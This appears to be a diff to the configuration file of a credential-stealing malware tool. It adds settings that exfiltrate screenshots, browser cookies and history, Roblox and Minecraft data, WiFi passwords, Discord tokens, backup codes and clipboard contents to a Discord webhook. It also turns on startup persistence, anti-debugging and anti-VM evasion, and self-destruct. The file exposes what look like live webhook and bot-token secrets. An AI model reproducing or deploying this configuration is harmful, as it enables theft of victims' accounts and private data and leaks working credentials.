@@ -1,5 +1,24 @@
 {
-  "WEBHOOK": "https://discord.com/api/webhooks/1432480906882318397/QrZY-cYZE_i5JUmur8p9c7jVEe-QCGNC_97JuU2KM8FoQ_uehmwUVlCyoBpjVbjfbiVy",
-  "RUN_ON_STARTUP": true,
-  "SCREENSHOT_INTERVAL": 5
+  "webhook_url": "https://discord.com/api/webhooks/1432480906882318397/QrZY-cYZE_i5JUmur8p9c7jVEe-QCGNC_97JuU2KM8FoQ_uehmwUVlCyoBpjVbjfbiVy",
+  "discord_bot_token": "MTQzMjQ0ODU1OTY0MjQ0MzkxMQ.GemqOu.uoGAATV2IBKpSDCLsbmfInI7BhVgxq8ZNsri5o",
+  "screenshot_interval_minutes": 2,
+  "run_on_startup": true,
+
+  "enable_ping": true,
+  "ping_type": "Everyone",
+
+  "log_system_info": true,
+  "log_backup_codes": true,
+  "log_browser_data": true,
+  "log_browser_cookies": true,
+  "log_browser_history": true,
+  "log_roblox_cookies": true,
+  "log_minecraft_data": true,
+  "log_wifi_passwords": true,
+  "log_discord_tokens": true,
+  "log_clipboard_data": true,
+  
+  "enable_anti_debug_vm": true,
+  "enable_anti_spam": true,
+  "enable_self_destruct": true
 }
